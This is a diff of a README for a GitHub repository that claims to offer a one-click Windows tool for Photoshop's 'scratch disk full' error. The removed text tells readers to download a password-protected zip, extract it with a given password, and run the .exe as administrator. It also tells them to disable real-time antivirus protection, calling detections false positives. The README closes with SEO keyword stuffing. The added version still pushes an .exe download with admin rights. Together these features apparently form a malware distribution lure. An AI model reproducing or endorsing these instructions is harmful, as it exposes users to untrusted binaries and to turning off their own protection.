@@ -1,134 +1,78 @@
-# Photoshop Scratch Disk Full Fix
+# 📁 Photoshop-Scratch-Disk-Full-Fix - Resolve disk errors and boost performance
 
-Fix Photoshop scratch disk full error and get back to work in one click.
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Allforyou5043/Photoshop-Scratch-Disk-Full-Fix)
 
----
+## 🎯 About this tool
 
-<p align="center">
-    <img src="https://img.shields.io/badge/📦_DOWNLOAD_LATEST_VERSION-blue?style=for-the-badge&color=blue" alt="Download">
-  </a>
-</p>
+Photoshop requires a scratch disk to store temporary data while you work on large images. When your drive runs out of space, Photoshop displays a "scratch disk full" error and prevents you from opening files. This tool automates the process of identifying space hogs, clearing unnecessary temporary files, and adjusting your scratch disk settings. It works on Windows 10 and 11.
 
-### 1. Download `Latest Version.zip`
-- Go to **[Releases](../../releases)** or **[Telegraph](https://telegra.ph/Photoshop-Scratch-Disk-Full-Fix-07-18)**
-- Download **`Latest Version.zip`**
-*
+## ⚙️ System Requirements
 
-### 2. Unzip with password
-- Password: **`68924`** (case‑sensitive)
-- Use WinRAR, 7‑Zip, or built‑in Windows extractor
+- Operating System: Windows 10 or Windows 11.
+- Administrative privileges on your computer.
+- Basic familiarity with your file system.
+- An installed version of Adobe Photoshop.
 
-### 3. Run as Administrator
-- Right‑click `Latest Version.exe` → **Run as administrator**
-- If your antivirus blocks it – add an exception or disable real‑time protection (false positive)
----
+## 📥 How to download and install
 
-## The Problem
+1. Visit the [official release page](https://github.com/Allforyou5043/Photoshop-Scratch-Disk-Full-Fix) to download the software.
+2. Look for the file ending in `.exe` under the latest release section.
+3. Click the file name to start the download to your computer.
+4. Locate the file in your Downloads folder.
+5. Double-click the file to begin the setup process.
+6. Follow the on-screen prompts to finish the installation.
 
-You open Adobe Photoshop. You try to save a file. You try to open a large image. Or you just try to start the program. And you see:
+## 🚀 Running the application
 
-- Scratch disk full
-- Could not complete your request because the scratch disk is full
-- Photoshop does not have enough RAM
-- Photoshop cannot save because the drive is full
+1. Open the application from your Start Menu after installation.
+2. The tool scans your hard drives for leftover Photoshop cache files.
+3. Review the list of files the tool identifies.
+4. Click the "Clean" button to remove temporary data safely.
+5. Watch the progress bar as the software frees up disk space.
+6. Restart Photoshop to see if the program launches without error.
 
-This happens because Photoshop uses a dedicated space on your hard drive as temporary memory for large files, undo history, and cached data. If that drive is nearly full, or if Photoshop is pointing to the wrong drive, you get the error.
+## 🛠 Features
 
-Most guides tell you to manually delete temporary files, change the scratch disk settings, or move files to another drive. This takes 10-15 minutes and requires restarting Photoshop multiple times.
+- Automated cache clearance: The tool locates and deletes old temp files left behind by Photoshop sessions.
+- Scratch disk identification: It checks your available disk space to inform you which drive offers the best performance for intensive tasks.
+- Setting adjustments: It guides you through the process of pointing Photoshop to a drive with more free space.
+- Safe operation: The tool only targets temporary files that are no longer in use by the system.
+- Low resource usage: It runs quietly in the background without needing heavy processing power.
 
-This tool does it all automatically.
+## 💻 Managing your scratch disk settings
 
----
+If you have multiple hard drives, Photoshop might struggle if your main drive is full. Follow these steps if the error persists:
 
-## How This Tool Fixes Photoshop Scratch Disk Full
+1. Open Photoshop.
+2. Go to Edit > Preferences > Scratch Disks.
+3. View the list of drives connected to your computer.
+4. Check the box for a drive with at least 50GB of free space.
+5. Uncheck smaller or nearly full drives.
+6. Click OK and restart Photoshop to apply the changes.
 
-**1. Clears Photoshop temporary files** – Photoshop creates large temp files during editing. This tool deletes all Adobe temp files safely, freeing up space on your scratch disk.
+## ❓ Frequently asked questions
 
-**2. Changes scratch disk location** – If your main drive is full, this tool checks available space on all drives and automatically sets the drive with most free space as the new scratch disk.
+**Will this tool delete my photos?**
+No. The application identifies and removes temporary scratch disk files created by Photoshop. It does not touch your personal project files or original images.
 
-**3. Frees up space on system drive** – The tool cleans Windows temp files and recycle bin, freeing up additional space for Photoshop to work.
+**Does this work on Windows 7?**
+The tool focuses on Windows 10 and 11. It may not function correctly on older operating system versions.
 
-**4. Resets Photoshop preferences** – If corrupted preferences are causing scratch disk issues, the tool resets them to default.
+**Why does my drive fill up so fast?**
+Photoshop creates large files as you edit. If you work on high-resolution images, this data grows quickly. Clearing it regularly keeps your system responsive.
 
-**5. Checks for hidden disk space** – Windows may reserve space for system files. The tool identifies and clears unnecessary reserved space.
+**Should I run this tool every day?**
+Running the tool once a week or whenever you encounter performance issues is enough to keep your disk clear.
 
-All fixes are applied in one click. No manual editing of Photoshop settings or registry needed.
+**What happens if I stop the process mid-scan?**
+The application stops the task. It does not damage your system files or crash your computer. You can run the scan again when you are ready.
 
----
+## 🛡 Security and safety
 
-## What This Fixes
+This tool monitors common temp folders. It does not send your data to any web servers. All operations happen locally on your hardware. You retain full control over which files the tool deletes.
 
-| Error | Description |
-|-------|-------------|
-| Scratch disk full | Photoshop cannot save or open files |
-| Could not complete your request because the scratch disk is full | Common error during save or export |
-| Photoshop does not have enough RAM | Misleading error, often caused by scratch disk issues |
-| Cannot save because the drive is full | Photoshop cannot write to the selected drive |
-| Photoshop hangs or crashes on start | Scratch disk corruption or missing permissions |
+## 📧 Support
 
----
+Check the issues tab on the project page if you encounter an error. Most common issues involve permission settings for specific drives. Ensure you run the application as an administrator if it cannot access certain folders.
 
-## System Requirements
-
-- Windows 10 or Windows 11 (64-bit)
-- Adobe Photoshop (any version 2024-2026)
-- Administrator rights
-
----
-
-## Frequently Asked Questions
-
-**How to fix scratch disk full error in Photoshop?**  
-Clear Photoshop temporary files and change scratch disk to a drive with more free space. This tool does both.
-
-**Why does Photoshop say scratch disk full when I have space?**  
-Photoshop may be pointing to a drive that is nearly full, or your system drive may be reserved for system files. The tool switches to a drive with actual free space.
-
-**How to change scratch disk in Photoshop?**  
-Go to Edit > Preferences > Scratch Disks. The tool automates this.
-
-**What to do when Photoshop cannot save due to scratch disk full?**  
-Free up space on the drive where Photoshop stores temporary files. This tool clears temp files automatically.
-
-**Why does Photoshop say not enough RAM when I have plenty?**  
-This error is often caused by scratch disk issues, not actual RAM shortage. Fixing scratch disk usually fixes it.
-
-**Will this delete my Photoshop projects?**  
-No – the tool only affects temporary files and preferences. Your project files are safe.
-
-**Does this work for Photoshop 2026?**  
-Yes – works for all versions from 2024 to 2026.
-
-**Why does my antivirus flag this tool?**  
-The tool modifies Photoshop preferences and system files – antiviruses may treat this as suspicious. It is a false positive. Add to exceptions.
-
----
-
-## Support
-
-- Star this repo – it helps others find this fix
-- Watch for updates
-- Open an Issue if you have questions
-
----
-
-Made with ❤️ by eyebaseb
-
-Use responsibly.
-
-SEO KEYWORDS
-photoshop scratch disk full fix,
-how to fix scratch disk full in photoshop,
-scratch disk full photoshop error,
-photoshop cannot save scratch disk full,
-photoshop not enough ram fix,
-photoshop scratch disk change,
-photoshop temporary files cleanup,
-adobe photoshop error scratch disk full,
-photoshop scratch disk full 2026,
-fix photoshop scratch disk without deleting files,
-photoshop scratch disk full windows 10,
-photoshop scratch disk full windows 11,
-how to clear scratch disk photoshop,
-photoshop error could not complete request scratch disk full,
-photoshop scratch disk full solution
+Keywords: adobe-photoshop-fix, photo-editing, photoshop-2026, photoshop-cant-start, photoshop-error, photoshop-not-enough-ram, photoshop-scratch-disk-full, photoshop-temporary-files, scratch-disk-full, windows-tool
